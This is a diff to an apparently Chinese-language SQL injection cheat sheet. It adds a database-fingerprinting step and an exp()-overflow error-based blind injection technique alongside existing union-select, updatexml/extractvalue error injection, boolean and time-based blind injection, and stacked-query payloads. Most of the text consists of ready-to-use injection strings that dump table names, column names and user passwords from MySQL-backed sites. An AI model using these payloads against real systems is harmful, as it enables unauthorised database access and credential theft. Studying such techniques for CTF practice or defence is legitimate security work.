@@ -1,8 +1,14 @@
+判断数据库类型  
+1' 报错  
+看报错页区别  
+各家延时注入语法判断  
+
 union/**/select  
 group_concat(table_name)  from information_schema.tables where table_schema = database()  
 group_concat(column_name) from information_schema.columns where table_schema='facebook' and table_name = 'xxx'  
 ?id=-1' union select 1,2,group_concat(username ,id , password) from users--+  
 
+------
 报错注入  
 extractvalue  
 id='and(select extractvalue("anything",concat('~',(select语句))))  
@@ -24,7 +30,8 @@ id='and(select updatexml("anything",concat('~',(select语句())),"anything"))
 爆表名：'and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))  
 爆列名：'and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name="TABLE_NAME")),0x7e))  
 爆数据：'and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))  
- 
+
+--------- 
 盲注  
 常用函数  
   length（str）函数 返回字符串的长度  
@@ -41,6 +48,7 @@ id='and(select updatexml("anything",concat('~',(select语句())),"anything"))
 	lpad（str，len，padstr）  
 	rpad（str，len，padstr）在str的左（右）两边填充给定的padstr到指定的长度len，返回填充的结果  
 
+--------------
 布尔盲注一般流程  
 因为盲注不能直接用database（）函数得到数据库名，所以步骤如下：  
 ①判断数据库名的长度：and length(database())>11 回显正常；and length(database())>12 回显错误，说明数据库名是等于12个字符。  
@@ -49,7 +57,26 @@ id='and(select updatexml("anything",concat('~',(select语句())),"anything"))
 ④猜测字段名（列名）：and (ascii(substr((select column_name from information_schema.columns where table.schema=database() and table_name=’数据库表名’ limit 0,1)1,1)>105 --+ 经过猜测 ascii为 105 为i 也就是表的第一个列名 id的第一个字母;同样,通过修改 limit 0,1 获取第二个列名 修改后面1,1的获取当前列的其他字段.  
 ⑤猜测字段内容：因为知道了列名，所以直接 select password from users 就可以获取password里面的内容，username也一样 and (ascii(substr(( select password from users limit 0,1),1,1)))=68--+  
 
-时间盲注  
+报错法   
+报错法就是使用 exp()方法，该方法在 709 数值之内不会报错，当大于等于 710，就会 报错。  
+<img width="1174" height="670" alt="image" src="https://github.com/user-attachments/assets/d59b5fb9-0668-4db6-8e8e-1da42d10f944" />  
+like+exp  
+select * from student where id = '1' and exp(710-(database()like'a%')) and '1'   
+select * from users where id =1 and exp(710-database()like'D%');  
+like 被过滤的用法  
+select * from users where id = 1 and exp(710-ascii(CURRENT_USER));
+
+然后就是把 710 往上提升，直到正好 x-ascii(CURRENT_USER)=710 或者 709  
+就可以判断可以个数值的 ascii 值。  
+r 的 ascii 值为 114，因此可以使用 823 和 824 进行判断。  
+select * from users where id = 1 and  
+exp(823-ascii(CURRENT_USER));  
+select * from users where id = 1 and  
+exp(824-ascii(CURRENT_USER));  
+
+
+
+时间盲注    
 常用函数  
 	sleep(n)：将程序挂起一段时间 n为n秒。  
 	if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句。  
@@ -82,6 +109,7 @@ select *,1 from flag
 1 || flag  
 select *,1 from flag  
 
+--------------
 堆叠注入  
 1;show databases;  
 1;show tables;  
